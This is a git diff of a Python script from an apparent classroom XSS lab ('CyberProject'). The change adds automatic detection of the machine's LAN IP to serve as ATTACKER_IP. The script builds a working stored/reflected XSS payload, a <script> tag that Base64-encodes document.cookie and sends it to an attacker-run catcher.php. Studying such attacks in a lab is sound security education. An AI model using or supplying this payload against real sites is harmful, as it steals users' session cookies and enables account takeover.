@@ -1,15 +1,25 @@
+import socket
 import urllib.parse
 
-# Default to localhost so the lab works out of the box on a single XAMPP
-# machine. For a real network XSS demo across two computers, change
-# TARGET_IP to the IP of the vulnerable site's host and ATTACKER_IP to
-# the IP of the machine running the catcher (AttackerServer/catcher.php).
+
+def detect_lan_ip():
+    # Open a UDP socket toward a public address. No packet is actually
+    # sent (we never call sendto), but the OS picks the outbound
+    # interface so getsockname() returns this machine's LAN IP.
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        s.connect(("8.8.8.8", 80))
+        return s.getsockname()[0]
+    except OSError:
+        return None
+    finally:
+        s.close()
+
+
 TARGET_IP = "localhost"
 TARGET_URL = f"http://{TARGET_IP}/CyberProject/home.php"
 
-# Attacker's address (where data will be sent)
-# we can use our own IP address or the IP address of the machine running the catcher (AttackerServer/catcher.php).
-ATTACKER_IP = "localhost"
+ATTACKER_IP = detect_lan_ip() or input("Could not auto-detect LAN IP. Enter attacker IP: ").strip()
 
 # The Payload: stealing cookies and sending them to log.php
 js_payload = f"<script>document.location='http://{ATTACKER_IP}/CyberProject/AttackerServer/catcher.php?data=' + btoa(document.cookie);</script>" # btoa - a function that encodes a string to Base64 to hide the cookies
